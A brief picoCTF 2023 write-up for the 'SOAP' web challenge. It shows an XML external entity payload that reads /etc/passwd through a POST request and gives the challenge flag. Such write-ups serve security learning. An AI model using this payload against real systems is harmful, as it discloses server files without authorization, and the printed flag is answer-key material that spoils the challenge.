# SOAP
- [Challenge information](#challenge-information)
- [Overview](#overview)
- [Solution](#solution)
- [Flag](#flag)
## Challenge information
```text
Tags: Web Explotation, picoCTF 2023, XXE

Description: 
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Hints: 
1. XML external entity Injection
```
## Overview
![alt text](/picoCTF/Static/Images/SOAP/image1.png)  
## Solution
**Step 1:**  Exploit  
![alt text](/picoCTF/Static/Images/SOAP/image2.png)  
* Request uses xml as the payload to send the post  
=> Xml injection vulnerability exists  
* We will use:  
```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 

]>

<data><ID>&xxe;</ID></data>
```
## Flag
`picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}`
